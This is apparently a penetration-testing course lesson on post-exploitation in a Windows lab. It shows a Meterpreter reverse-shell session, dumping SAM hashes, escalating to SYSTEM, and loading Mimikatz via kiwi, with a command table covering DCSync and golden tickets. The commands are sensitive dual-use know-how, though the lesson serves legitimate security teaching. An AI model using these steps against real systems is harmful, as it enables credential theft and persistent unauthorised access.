# Day 21 — Maintaining Persistence
[← Back to overview](README.md)

## From One-Time Access to Persistent Access
Getting a shell once (Day 17/20) isn't the end goal in a real engagement — systems reboot, sessions die, and users
log off. Day 21 covers how an attacker (or a tester demonstrating the risk) **maintains access** across those events,
using Metasploit's built-in Mimikatz integration and credential harvesting inside an active Meterpreter session.

## Recap — Getting the Session
Same reliable pattern from Day 17 — generate a payload, catch it with a matching handler:
```bash
msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload ⇒ windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.29.160
LHOST ⇒ 192.168.29.160
msf6 exploit(multi/handler) > set LPORT 4499
LPORT ⇒ 4499
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.29.160:4499
[*] Sending stage (176198 bytes) to 192.168.29.29
[*] Meterpreter session 1 opened (192.168.29.160:4499 → 192.168.29.29:49777) at 2024-12-20 05:28:16 -0500

meterpreter > sysinfo
Computer        : DESKTOP-5RFFFDT
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

## Harvesting Credentials In-Session — `hashdump`
Once inside Meterpreter, a quick built-in command dumps every local account's password hash straight from SAM:
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Tony Stark:1001:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c39cb179a9dfe0f7eda71ada6167583b:::
```
Every local user's hash (Administrator, default/guest accounts, and a real user "Tony Stark") captured in a single
command — each of these becomes a candidate for offline cracking or Pass-the-Hash reuse, exactly as seen with domain
hashes on Day 20.

## Elevating & Confirming Privilege
```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
`getsystem` automatically tries several known privilege-escalation techniques and confirms success — the session now
runs as `NT AUTHORITY\SYSTEM`, the highest local privilege level on Windows, needed for full credential/persistence access.

## Metasploit's Built-in Mimikatz — the `kiwi` Extension
Rather than manually dropping a separate `mimikatz.exe` binary (Day 20's approach), Metasploit ships its own
in-memory Mimikatz integration:
```
meterpreter > mimikatz
[-] Unknown command: mimikatz. Run the help command for more details.
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
  '## v ##'       Vincent LE TOUX              ( vincent.letoux@gmail.com )
   '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.
```
The correct command is `load kiwi`, not `mimikatz` directly — Meterpreter loads Mimikatz's full capability as a
scriptable extension inside the same session, no separate file transfer needed.

### Kiwi command reference
| Command | Description |
|---|---|
| `creds_all` | Retrieve all credentials (parsed). |
| `creds_kerberos` | Retrieve Kerberos creds (parsed). |
| `creds_livessp` | Retrieve Live SSP creds. |
| `creds_msv` | Retrieve LM/NTLM creds (parsed). |
| `creds_ssp` | Retrieve SSP creds. |
| `creds_tspkg` | Retrieve TsPkg creds (parsed). |
| `creds_wdigest` | Retrieve WDigest creds (parsed). |
| `dcsync` | Retrieve user account info via DCSync (unparsed). |
| `dcsync_ntlm` | Retrieve user NTLM hash, SID and RID via DCSync. |
| `golden_ticket_create` | Create a golden Kerberos ticket. |
| `kerberos_ticket_list` / `_purge` / `_use` | List, purge, or use Kerberos tickets. |
| `kiwi_cmd` | Execute an arbitrary raw Mimikatz command. |
| `lsa_dump_sam` | Dump the LSA SAM database. |
| `lsa_dump_secrets` | Dump LSA secrets. |
| `password_change` | Change the password/hash of a user. |
| `wifi_list` / `wifi_list_shared` | List saved Wi-Fi profiles/credentials. |

**Retrieving WDigest credentials (often plaintext on older/unpatched systems):**
```
meterpreter > creds_wdigest
[+] Running as SYSTEM
[*] Retrieving wdigest credentials
```

## Why It Matters
This is the persistence-and-lateral-movement engine of a real compromise: `hashdump` and the `kiwi` extension turn
one foothold into a full map of every credential on the box (and potentially the domain, via `dcsync`), while
`getsystem` guarantees the access needed to keep pulling that data even if the initial exploited service is patched
or restarted. Kerberos golden tickets (`golden_ticket_create`) go a step further — allowing an attacker to forge
domain authentication that survives password changes entirely, which is exactly why credential rotation alone is
never a sufficient response to this kind of compromise; affected systems and the domain's krbtgt account need to be
rebuilt/reset.

## 🧠 Quick Revision Questions
1. Why is `load kiwi` used instead of a `mimikatz` command directly inside Meterpreter?
2. What privilege does `getsystem` obtain, and why does that matter for running `hashdump`/`kiwi` commands reliably?
3. Why is a Kerberos "golden ticket" more dangerous long-term than a single stolen NTLM hash?

## 🔑 New Glossary Terms
- **hashdump** — a Meterpreter command that dumps local SAM account password hashes.
- **getsystem** — a Meterpreter command that attempts several known techniques to escalate to SYSTEM privilege.
- **Kiwi** — Metasploit's built-in, in-memory Mimikatz extension for Meterpreter.
- **DCSync** — a technique/attack that abuses domain replication rights to pull password hashes directly from a Domain Controller.
- **Golden Ticket** — a forged Kerberos Ticket Granting Ticket (TGT) that grants persistent domain-wide access.
- **WDigest** — a legacy Windows authentication protocol that can expose plaintext credentials in memory.

---
[← Day 20](day20.md) | [Back to overview](README.md) | [Next: Day 22 →](day22.md)
